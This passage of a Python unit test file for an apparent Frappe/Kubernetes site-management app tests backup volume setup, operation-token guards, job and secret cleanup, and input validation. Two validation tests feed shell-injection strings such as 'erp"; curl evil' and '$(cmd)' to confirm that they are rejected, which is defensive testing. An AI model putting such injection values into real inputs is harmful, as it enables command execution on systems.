	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_prepare_backup_ref_spec_defaults_to_rwx_when_unset(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		from kubernetes.client.rest import ApiException

		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class=None,
			backup_access_mode=None,
		)
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.side_effect = ApiException(
			status=404,
		)
		ref_spec = {"volumes": [], "volume_mounts": []}

		_prepare_backup_ref_spec(
			doc=SimpleNamespace(),
			release=SimpleNamespace(cluster="cluster-a"),
			namespace="ns",
			api_client=api_client,
			ref_spec=ref_spec,
		)

		manifest = mock_apply_resource.call_args.args[1]
		self.assertEqual(manifest["spec"]["accessModes"], ["ReadWriteMany"])

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_prepare_backup_ref_spec_skips_apply_when_existing_pvc_matches(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class=None,
			backup_access_mode="ReadWriteOnce",
		)
		existing = SimpleNamespace(spec=SimpleNamespace(access_modes=["ReadWriteOnce"]))
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.return_value = existing
		ref_spec = {"volumes": [], "volume_mounts": []}

		_prepare_backup_ref_spec(
			doc=SimpleNamespace(),
			release=SimpleNamespace(cluster="cluster-a"),
			namespace="ns",
			api_client=api_client,
			ref_spec=ref_spec,
		)

		mock_apply_resource.assert_not_called()
		self.assertEqual(ref_spec["volumes"][0]["persistentVolumeClaim"]["claimName"], BACKUP_PVC_NAME)
		self.assertEqual(ref_spec["volume_mounts"][0]["mountPath"], BACKUP_MOUNT_PATH)

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_prepare_backup_ref_spec_raises_on_access_mode_mismatch(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class=None,
			backup_access_mode="ReadWriteOnce",
		)
		existing = SimpleNamespace(spec=SimpleNamespace(access_modes=["ReadWriteMany"]))
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.return_value = existing
		ref_spec = {"volumes": [], "volume_mounts": []}

		with self.assertRaises(RuntimeError) as cm:
			_prepare_backup_ref_spec(
				doc=SimpleNamespace(),
				release=SimpleNamespace(cluster="cluster-a"),
				namespace="ns",
				api_client=api_client,
				ref_spec=ref_spec,
			)

		message = str(cm.exception)
		self.assertIn("immutable", message)
		self.assertIn("ReadWriteMany", message)
		self.assertIn("ReadWriteOnce", message)
		mock_apply_resource.assert_not_called()

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_ensure_backup_pvc_converts_422_to_runtime_error(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		"""422 from apply_resource (race or pre-existing PVC) becomes a clear RuntimeError."""
		from kubernetes.client.rest import ApiException

		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class=None,
			backup_access_mode="ReadWriteMany",
		)
		# Simulate: read returns 404 (PVC not found initially)
		not_found = ApiException(status=404)
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.side_effect = [
			not_found,  # first call in _ensure_backup_pvc
			SimpleNamespace(spec=SimpleNamespace(access_modes=["ReadWriteOnce"])),  # re-read after 422
		]
		# apply_resource raises 422 (PVC was created concurrently with wrong mode)
		mock_apply_resource.side_effect = ApiException(status=422)
		ref_spec = {"volumes": [], "volume_mounts": []}

		with self.assertRaises(RuntimeError) as cm:
			_prepare_backup_ref_spec(
				doc=SimpleNamespace(),
				release=SimpleNamespace(cluster="cluster-a"),
				namespace="ns",
				api_client=api_client,
				ref_spec=ref_spec,
			)

		message = str(cm.exception)
		self.assertIn("immutable", message)
		self.assertIn("ReadWriteOnce", message)
		self.assertIn("ReadWriteMany", message)


class UnitTestOperationTokenGuard(UnitTestCase):
	def test_site_operation_matches_returns_false_on_token_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "current", "status": "In Progress"}
			self.assertFalse(_site_operation_matches("site", "stale", "In Progress"))

	def test_site_operation_matches_returns_false_on_status_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "Active"}
			self.assertFalse(_site_operation_matches("site", "token", "In Progress"))

	def test_site_operation_matches_returns_true_when_both_match(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "In Progress"}
			self.assertTrue(_site_operation_matches("site", "token", "In Progress"))

	def test_site_operation_matches_accepts_deleting_and_migrating(self):
		"""The guard is reused across all in-flight operations — a token-match
		on Deleting / Migrating must succeed the same way it does on In Progress.
		"""
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		for status in ("Deleting", "Migrating"):
			with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
				mock_get.return_value = {"operation_token": "token", "status": status}
				self.assertTrue(
					_site_operation_matches("site", "token", status),
					f"guard should accept matching token for status={status!r}",
				)
				# And must reject a stale create-time token if the row has moved
				# on to Deleting/Migrating (different expected_status).
				self.assertFalse(_site_operation_matches("site", "token", "In Progress"))


def _fake_frappe_site_doc(site_name: str = "demo.example.com") -> MagicMock:
	"""Build a mock Frappe Site doc with typical fields populated."""
	doc = MagicMock()
	doc.name = f"release-a/{site_name}"
	doc.site_name = site_name
	doc.bench_release = "release-a"
	doc.db_type = "mariadb"
	doc.install_apps = "erpnext"
	doc.force_create = 0
	doc.db_root_secret = ""
	doc.db_root_secret_key = "mariadb-root-password"
	# get_password returns the secret regardless of which field is asked for,
	# but tests inspect the calls to distinguish.
	doc.get_password.side_effect = lambda field: {
		"admin_password": "admin-pw",
		"db_root_password": "root-pw",
	}.get(field, "")
	doc.db_set = MagicMock()
	return doc


def _fake_release() -> MagicMock:
	release = MagicMock()
	release.cluster = "cluster-a"
	release.namespace = "bench-ns"
	release.release_name = "bench-a"
	return release


class UnitTestCreateSiteTask(UnitTestCase):
	"""End-to-end mocked tests for ``create_site_task``.

	These cover the orchestration path (K8s client setup, Secret+Job apply,
	token bookkeeping, failure rollback) that the helper-level tests above
	never exercise.
	"""

	def test_create_site_task_exits_early_when_token_superseded(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		with (
			patch.object(site_tasks, "_site_operation_matches", return_value=False),
			patch.object(site_tasks, "frappe") as mock_frappe,
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
		):
			site_tasks.create_site_task("release-a/demo", "stale-token")
			# Stale worker must not even fetch the doc.
			mock_frappe.get_doc.assert_not_called()
			mock_get_client.assert_not_called()

	def test_create_site_task_applies_secret_then_job_and_sets_tokens(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		doc = _fake_frappe_site_doc()
		release = _fake_release()
		applied: list[tuple[str, dict]] = []

		def _apply(_api_client, manifest, _ns):
			from copy import deepcopy

			applied.append((manifest["kind"], deepcopy(manifest)))

		with (
			patch.object(site_tasks, "_site_operation_matches", return_value=True),
			patch.object(site_tasks, "frappe") as mock_frappe,
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
			patch.object(site_tasks, "_select_site_discovery_pod") as mock_select,
			patch.object(site_tasks, "_clone_reference_pod_spec") as mock_clone,
			patch.object(site_tasks, "apply_resource", side_effect=_apply),
			patch.object(site_tasks, "client") as mock_client,
		):
			mock_frappe.get_doc.side_effect = lambda doctype, name: (
				doc if doctype == "Frappe Site" else release
			)
			mock_get_client.return_value = MagicMock()
			mock_select.return_value = MagicMock()
			mock_clone.return_value = {
				"image": "frappe/erpnext:v15.0.0",
				"pod_level": {},
				"container_env": [{"name": "DB_HOST", "value": "release-a-mariadb"}],
				"container_env_from": [],
				"container_resources": None,
				"container_security_context": None,
				"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
				"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "s-pvc"}}],
			}
			# Read back fake Job with a UID so the ownerRef patch runs.
			batch_api = MagicMock()
			batch_api.read_namespaced_job.return_value = SimpleNamespace(
				metadata=SimpleNamespace(uid="job-uid-123")
			)
			mock_client.BatchV1Api.return_value = batch_api
			mock_client.CoreV1Api.return_value = MagicMock()

			site_tasks.create_site_task("release-a/demo.example.com", "tok" * 10 + "ab")

		# Exactly three applies: Secret (first), Job, Secret again with ownerRef.
		kinds = [k for k, _ in applied]
		self.assertEqual(kinds, ["Secret", "Job", "Secret"])

		# The Secret is named after the Job and owner-referenced on the
		# second apply, guaranteeing GC-on-Job-delete.
		secret_first = applied[0][1]
		job_manifest = applied[1][1]
		secret_second = applied[2][1]
		self.assertTrue(secret_first["metadata"]["name"].endswith("-creds"))
		self.assertEqual(
			secret_first["metadata"]["name"],
			job_manifest["metadata"]["name"] + "-creds",
		)
		self.assertNotIn("ownerReferences", secret_first["metadata"])
		self.assertEqual(secret_second["metadata"]["ownerReferences"][0]["uid"], "job-uid-123")

		# No plaintext password env values anywhere on the Job.
		container = job_manifest["spec"]["template"]["spec"]["containers"][0]
		for entry in container["env"]:
			if entry["name"] in ("ADMIN_PASSWORD", "DB_ROOT_PASSWORD"):
				self.assertNotIn("value", entry)
				self.assertIn("valueFrom", entry)

		# Doc got its job-bookkeeping fields set.
		set_fields = {call.args[0] for call in doc.db_set.call_args_list}
		self.assertIn("operation_job_name", set_fields)
		self.assertIn("operation_job_token", set_fields)

	def test_create_site_task_deletes_orphan_job_when_token_superseded_after_apply(self):
		"""If the doc is cancelled/deleted/force-recreated between our first
		token check and the re-check after the Job apply, we must tear down
		the Job we just created. Otherwise it runs to completion untracked
		and creates an orphan site on the bench PVC.
		"""
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		doc = _fake_frappe_site_doc()
		release = _fake_release()

		# True on entry (line 57), False on the post-apply re-check (line 152).
		match_calls = iter([True, False])

		deleted_jobs: list[str] = []
		deleted_secrets: list[str] = []

		def _capture_delete_job(_api_client, name, _namespace):
			deleted_jobs.append(name)

		def _capture_delete_secret(_api_client, name, _namespace):
			deleted_secrets.append(name)

		with (
			patch.object(
				site_tasks, "_site_operation_matches", side_effect=lambda *a, **kw: next(match_calls)
			),
			patch.object(site_tasks, "frappe") as mock_frappe,
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
			patch.object(site_tasks, "_select_site_discovery_pod") as mock_select,
			patch.object(site_tasks, "_clone_reference_pod_spec") as mock_clone,
			patch.object(site_tasks, "apply_resource"),
			patch.object(site_tasks, "_best_effort_delete_job", side_effect=_capture_delete_job),
			patch.object(site_tasks, "_best_effort_delete_secret", side_effect=_capture_delete_secret),
			patch.object(site_tasks, "client") as mock_client,
		):
			mock_frappe.get_doc.side_effect = lambda doctype, name: (
				doc if doctype == "Frappe Site" else release
			)
			mock_get_client.return_value = MagicMock()
			mock_select.return_value = MagicMock()
			mock_clone.return_value = {
				"image": "frappe/erpnext:v15.0.0",
				"pod_level": {},
				"container_env": [{"name": "DB_HOST", "value": "release-a-mariadb"}],
				"container_env_from": [],
				"container_resources": None,
				"container_security_context": None,
				"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
				"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "s-pvc"}}],
			}
			batch_api = MagicMock()
			batch_api.read_namespaced_job.return_value = SimpleNamespace(
				metadata=SimpleNamespace(uid="job-uid-123")
			)
			mock_client.BatchV1Api.return_value = batch_api
			mock_client.CoreV1Api.return_value = MagicMock()

			site_tasks.create_site_task("release-a/demo.example.com", "tok" * 10 + "ab")

		# Both the orphan Job and its creds Secret must be torn down, and the
		# Job name must match the Secret name minus the '-creds' suffix.
		self.assertEqual(len(deleted_jobs), 1)
		self.assertEqual(len(deleted_secrets), 1)
		self.assertEqual(f"{deleted_jobs[0]}-creds", deleted_secrets[0])

		# The superseded worker must NOT record job bookkeeping on the doc.
		set_fields = {call.args[0] for call in doc.db_set.call_args_list}
		self.assertNotIn("operation_job_name", set_fields)
		self.assertNotIn("operation_job_token", set_fields)

	def test_create_site_task_marks_failed_and_cleans_up_secret_on_exception(self):
		from unittest.mock import patch

		from kubeport.tasks import site_tasks

		doc = _fake_frappe_site_doc()
		release = _fake_release()

		def _apply_that_fails_on_job(_api_client, manifest, _ns):
			if manifest["kind"] == "Job":
				raise RuntimeError("simulated apiserver blip")

		deleted: list[str] = []

		def _capture_delete(_api_client, name, _namespace):
			deleted.append(name)

		with (
			patch.object(site_tasks, "_site_operation_matches", return_value=True),
			patch.object(site_tasks, "frappe") as mock_frappe,
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
			patch.object(site_tasks, "_select_site_discovery_pod") as mock_select,
			patch.object(site_tasks, "_clone_reference_pod_spec") as mock_clone,
			patch.object(site_tasks, "apply_resource", side_effect=_apply_that_fails_on_job),
			patch.object(site_tasks, "_best_effort_delete_secret", side_effect=_capture_delete),
			patch.object(site_tasks, "client") as mock_client,
		):
			mock_frappe.get_doc.side_effect = lambda doctype, name: (
				doc if doctype == "Frappe Site" else release
			)
			mock_get_client.return_value = MagicMock()
			mock_select.return_value = MagicMock()
			mock_clone.return_value = {
				"image": "frappe/erpnext:v15.0.0",
				"pod_level": {},
				"container_env": [{"name": "DB_HOST", "value": "release-a-mariadb"}],
				"container_env_from": [],
				"container_resources": None,
				"container_security_context": None,
				"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
				"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "s-pvc"}}],
			}
			mock_client.BatchV1Api.return_value = MagicMock()
			mock_client.CoreV1Api.return_value = MagicMock()

			site_tasks.create_site_task("release-a/demo.example.com", "tok" * 10 + "ab")

		# Orphan-Secret cleanup fired with the expected name.
		self.assertEqual(len(deleted), 1)
		self.assertTrue(deleted[0].endswith("-creds"))

		# Doc marked Failed with a truncated status_detail.
		field_values = {call.args[0]: call.args[1] for call in doc.db_set.call_args_list}
		self.assertEqual(field_values.get("status"), "Failed")
		self.assertIn("simulated apiserver blip", field_values.get("status_detail", ""))


class UnitTestRestoreSubmissionFailure(UnitTestCase):
	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
	@patch("kubeport.tasks.site_tasks.frappe.db.set_value")
	@patch("kubeport.tasks.site_tasks._backup_operation_matches", return_value=True)
	@patch("kubeport.tasks.site_tasks._site_operation_matches", return_value=True)
	def test_failure_marks_site_failed_but_backup_available(
		self,
		mock_site_matches,
		mock_backup_matches,
		mock_set_value,
		mock_publish,
	):
		_fail_restore_submission(
			"rel-a/demo.example.com",
			"demo.example.com::demo-20260430120000",
			"token-1",
			"Kubernetes API refused the restore Job.",
		)

		mock_site_matches.assert_called_once_with("rel-a/demo.example.com", "token-1", "Migrating")
		mock_backup_matches.assert_called_once_with(
			"demo.example.com::demo-20260430120000",
			"token-1",
			("Restoring",),
		)
		mock_set_value.assert_any_call(
			"Frappe Site",
			"rel-a/demo.example.com",
			{
				"status": "Failed",
				"status_detail": "Restore attempt failed: Kubernetes API refused the restore Job.",
				"operation_job_name": "",
				"operation_job_token": "",
			},
		)
		mock_set_value.assert_any_call(
			"Frappe Site Backup",
			"demo.example.com::demo-20260430120000",
			{
				"status": "Available",
				"status_detail": "Restore attempt failed: Kubernetes API refused the restore Job.",
				"operation_job_name": "",
				"operation_job_token": "",
			},
		)
		mock_publish.assert_any_call(
			"frappe_site_backup_status_update",
			{
				"site_docname": "rel-a/demo.example.com",
				"backup_docname": "demo.example.com::demo-20260430120000",
				"status": "Available",
			},
			doctype="Frappe Site Backup",
			docname="demo.example.com::demo-20260430120000",
			after_commit=True,
		)


class UnitTestBestEffortDeleteJob(UnitTestCase):
	def test_ignores_404_without_logging(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=404, reason="NotFound")

		with (
			patch.object(site_tasks, "client") as mock_client,
			patch.object(site_tasks.frappe, "logger") as mock_logger,
		):
			mock_client.BatchV1Api.return_value = batch_api
			site_tasks._best_effort_delete_job(MagicMock(), "ks-demo-aaaabbbbcccc", "ns")

		mock_logger.assert_not_called()
		batch_api.delete_namespaced_job.assert_called_once()
		# Must propagate the cascade so owner-referenced Secret goes with it.
		_, kwargs = batch_api.delete_namespaced_job.call_args
		self.assertEqual(kwargs["propagation_policy"], "Background")

	def test_logs_warning_for_non_404_errors(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=500, reason="BoomError")

		with (
			patch.object(site_tasks, "client") as mock_client,
			patch.object(site_tasks.frappe, "logger") as mock_logger,
		):
			mock_client.BatchV1Api.return_value = batch_api
			mock_warn = MagicMock()
			mock_logger.return_value = SimpleNamespace(warning=mock_warn)
			site_tasks._best_effort_delete_job(MagicMock(), "ks-demo-aaaabbbbcccc", "ns")

		mock_warn.assert_called_once()


class UnitTestCancelSiteTask(UnitTestCase):
	def test_cancel_site_task_tolerates_404_on_job_delete(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=404, reason="NotFound")

		with (
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
			patch.object(site_tasks, "client") as mock_client,
			patch.object(site_tasks, "_best_effort_delete_secret") as mock_del_secret,
			patch.object(site_tasks.frappe, "log_error") as mock_log_error,
		):
			mock_get_client.return_value = MagicMock()
			mock_client.BatchV1Api.return_value = batch_api

			site_tasks.cancel_site_task("cluster-a", "bench-ns", "ks-demo-aaaabbbbcccc")

		# 404 must NOT raise or log an error; Secret cleanup must still run.
		mock_log_error.assert_not_called()
		mock_del_secret.assert_called_once()
		_, name, namespace = mock_del_secret.call_args.args
		self.assertEqual(name, "ks-demo-aaaabbbbcccc-creds")
		self.assertEqual(namespace, "bench-ns")

	def test_cancel_site_task_logs_non_404_errors_but_still_cleans_secret(self):
		from unittest.mock import patch

		from kubernetes.client.rest import ApiException

		from kubeport.tasks import site_tasks

		batch_api = MagicMock()
		batch_api.delete_namespaced_job.side_effect = ApiException(status=500, reason="BoomError")

		with (
			patch.object(site_tasks, "get_k8s_api_client") as mock_get_client,
			patch.object(site_tasks, "client") as mock_client,
			patch.object(site_tasks, "_best_effort_delete_secret") as mock_del_secret,
			patch.object(site_tasks.frappe, "log_error") as mock_log_error,
		):
			mock_get_client.return_value = MagicMock()
			mock_client.BatchV1Api.return_value = batch_api

			site_tasks.cancel_site_task("cluster-a", "bench-ns", "ks-demo-aaaabbbbcccc")

		mock_log_error.assert_called_once()
		# Even after a non-404 Job delete error, we still attempt Secret cleanup.
		mock_del_secret.assert_called_once()


class UnitTestControllerValidation(UnitTestCase):
	"""Tests for the FrappeSite controller validation methods.

	These cover the outer defense layer (DocType validate) that rejects bad
	input before it ever reaches the background worker.
	"""

	def _make_doc(self, **overrides):
		"""Build a minimal FrappeSite-like object for validation testing."""
		from unittest.mock import patch

		with patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe"):
			from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

			doc = FrappeSite.__new__(FrappeSite)
			doc.flags = MagicMock()
			defaults = {
				"name": "release-a/erp.example.com",
				"site_name": "erp.example.com",
				"bench_release": "",
				"cluster": "cluster-a",
				"namespace": "ns",
				"db_root_password": "pw",
				"db_root_secret": "",
				"install_apps": "",
				"status": "Draft",
				"admin_password": "pw",
				"db_type": "mariadb",
				"force_create": 0,
				"operation_job_name": "",
				"operation_job_token": "",
				"operation_token": "",
				"db_root_secret_key": "",
				"status_detail": "",
				"backup_schedule": "",
				"backup_retention_count": 0,
				"backup_retention_days": 0,
				"backup_schedule_last_run": None,
			}
			defaults.update(overrides)
			for k, v in defaults.items():
				setattr(doc, k, v)
			return doc

	def test_validate_site_name_accepts_valid_hostnames(self):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import _SITE_NAME_RE

		for name in ("erp.example.com", "a", "my_site", "s1.s2.s3", "a-b"):
			self.assertTrue(
				_SITE_NAME_RE.match(name),
				f"Expected '{name}' to be accepted as a valid site name",
			)

	def test_validate_site_name_rejects_shell_metacharacters(self):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import _SITE_NAME_RE

		for name in ('erp"; curl evil', "$(cmd)", "a/b", "A.B", "-leading", "trailing-"):
			self.assertIsNone(
				_SITE_NAME_RE.match(name),
				f"Expected '{name}' to be rejected as an invalid site name",
			)

	def test_validate_install_apps_rejects_shell_injection(self):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import _APP_NAME_RE

		for app in ('erpnext"; curl evil', "$(cmd)", "ERPNext", "has space"):
			self.assertIsNone(
				_APP_NAME_RE.match(app),
				f"Expected '{app}' to be rejected as an invalid app name",
			)

	def test_validate_install_apps_accepts_valid_names(self):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import _APP_NAME_RE

		for app in ("erpnext", "payments", "hrms", "custom-app", "my_app"):
			self.assertTrue(
				_APP_NAME_RE.match(app),
				f"Expected '{app}' to be accepted as a valid app name",
			)

	def test_validate_rejects_non_deployed_bench_release(self):
		"""The controller must block saving when the bench release is not deployed."""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a")

		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.status = "Draft"

		with patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe") as mock_frappe:
			mock_frappe.get_doc.return_value = mock_release
			mock_frappe.throw.side_effect = Exception("validation error")

			doc.is_new = lambda: True
			with self.assertRaises(Exception):
				doc.validate()

			# frappe.throw should have been called with a message about the status
			throw_args = mock_frappe.throw.call_args
			self.assertIn("Draft", throw_args.args[0])
			self.assertIn("deployed", throw_args.args[0].lower())

	def test_validate_allows_empty_db_root_credentials_for_bundled_default(self):
		"""validate() defers DB credential checks to create_site so the bundled-
		MariaDB default flow can save a doc with neither password nor secret;
		the worker auto-wires the chart's <release>-mariadb Secret at run time.
		"""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a", db_root_password="", db_root_secret="")
		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.status = "Deployed"

		with patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe") as mock_frappe:
			mock_frappe.get_doc.return_value = mock_release
			doc.is_new = lambda: True
			doc.validate()
			# No throw mentioning credentials.
			for call_args in mock_frappe.throw.call_args_list:
				self.assertNotIn(
					"db root password",
					str(call_args.args[0]).lower(),
				)

	def test_create_site_auto_engages_force_create_on_retry_from_failed(self):
		"""Frappe's site_config.json is non-overwriting; bench --force does not
		reset it.  A previously partial creation poisons retries unless we wipe
		the dir.  The bench Job's pre-clean is gated on force_create, so the
		controller must auto-engage it on Failed→retry — the operator should
		not have to know about the toggle to recover."""
		from unittest.mock import patch

		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		doc = MagicMock(spec=FrappeSite)
		doc.bench_release = "release-a"
		doc.site_name = "demo.example.com"
		doc.name = "release-a/demo.example.com"
		doc.status = "Failed"
		doc.force_create = 0
		# Bind the real action so we exercise controller logic.
		doc.create_site = FrappeSite.create_site.__get__(doc, FrappeSite)

		with (
			patch.object(FrappeSite, "_preflight_db_topology", return_value=None),
			patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue"),
			patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint"),
		):
			doc.create_site()

		set_calls = {call.args[0]: call.args[1] for call in doc.db_set.call_args_list}
		self.assertEqual(set_calls.get("force_create"), 1)
		self.assertEqual(doc.force_create, 1)

	def test_preflight_db_topology_passes_for_bundled_flow_when_service_exists(self):
		"""Bundled-MariaDB happy path: Service exists, no operator-supplied creds.
		Worker will auto-wire the chart's <release>-mariadb Secret at run time."""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a", db_root_password="", db_root_secret="")
		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.release_name = "rel-a"
		mock_release.use_external_database = 0

		with (
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_doc",
				return_value=mock_release,
			),
			patch(
				"kubeport.tasks.site_tasks.can_resolve_db_host_for_release",
				return_value=True,
			),
			patch(
				"kubeport.tasks.site_tasks._resolve_db_root_secret_for_release",
				return_value=("rel-a-mariadb", "mariadb-root-password"),
			),
			patch("kubeport.utils.k8s_client.get_k8s_api_client", return_value=MagicMock()),
		):
			# Should not throw.
			doc._preflight_db_topology()

	def test_preflight_db_topology_throws_when_no_release_owned_mariadb_service(self):
		"""Bundled flow but no <release>-mariadb Service in the namespace —
		the most common control-plane misconfiguration we want to catch
		before the user sits through a Job submission and a Failed status."""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a", db_root_password="pw")
		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.release_name = "rel-a"
		mock_release.use_external_database = 0

		with (
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_doc",
				return_value=mock_release,
			),
			patch(
				"kubeport.tasks.site_tasks.can_resolve_db_host_for_release",
				return_value=False,
			),
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.throw",
				side_effect=frappe.ValidationError,
			) as mock_throw,
		):
			with self.assertRaises(frappe.ValidationError):
				doc._preflight_db_topology()
			# Error message must reference both the release and the actionable fix.
			msg = str(mock_throw.call_args.args[0])
			self.assertIn("rel-a", msg)
			self.assertIn("MariaDB", msg)
			self.assertIn("Use External Database", msg)

	def test_preflight_db_topology_throws_for_external_db_without_credentials(self):
		"""External-DB topology requires operator-supplied creds; we trust
		their dbHost wiring but the credential gap would surface as an
		auth error inside the Job — better to catch it at the click."""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a", db_root_password="", db_root_secret="")
		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.release_name = "rel-a"
		mock_release.use_external_database = 1

		with (
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_doc",
				return_value=mock_release,
			),
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.throw",
				side_effect=frappe.ValidationError,
			) as mock_throw,
		):
			with self.assertRaises(frappe.ValidationError):
				doc._preflight_db_topology()
			msg = str(mock_throw.call_args.args[0])
			self.assertIn("external database", msg.lower())

	def test_preflight_db_topology_throws_when_bundled_flow_has_no_root_secret_and_no_creds(self):
		"""Bundled flow + no operator creds + the chart didn't expose a
		release-owned root Secret (e.g. user disabled mariadb.auth or used
		a non-Bitnami subchart).  Auto-wire would find nothing — fail
		early instead of letting the worker submit a Job that can't auth."""
		from unittest.mock import patch

		doc = self._make_doc(bench_release="release-a", db_root_password="", db_root_secret="")
		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.release_name = "rel-a"
		mock_release.use_external_database = 0

		with (
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_doc",
				return_value=mock_release,
			),
			patch(
				"kubeport.tasks.site_tasks.can_resolve_db_host_for_release",
				return_value=True,
			),
			patch(
				"kubeport.tasks.site_tasks._resolve_db_root_secret_for_release",
				return_value=("", ""),
			),
			patch("kubeport.utils.k8s_client.get_k8s_api_client", return_value=MagicMock()),
			patch(
				"kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.throw",
				side_effect=frappe.ValidationError,
			) as mock_throw,
		):
			with self.assertRaises(frappe.ValidationError):
				doc._preflight_db_topology()
			msg = str(mock_throw.call_args.args[0])
			self.assertIn("DB Root Password", msg)

	def test_create_site_does_not_engage_force_create_on_first_attempt_from_draft(self):
		"""From Draft (first creation), force_create must stay opt-in.  Auto-
		engaging it would silently destroy a freshly-uploaded site dir if the
		operator created the doc via API while the chart was provisioning."""
		from unittest.mock import patch

		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		doc = MagicMock(spec=FrappeSite)
		doc.bench_release = "release-a"
		doc.site_name = "demo.example.com"
		doc.name = "release-a/demo.example.com"
		doc.status = "Draft"
		doc.force_create = 0
		doc.create_site = FrappeSite.create_site.__get__(doc, FrappeSite)

		with (
			patch.object(FrappeSite, "_preflight_db_topology", return_value=None),
			patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue"),
			patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint"),
		):
			doc.create_site()

		set_calls = {call.args[0] for call in doc.db_set.call_args_list}
		self.assertNotIn("force_create", set_calls)

	def test_validate_accepts_deployed_bench_release(self):
		"""The controller must allow saving when the bench release is deployed."""
		from unittest.mock import patch

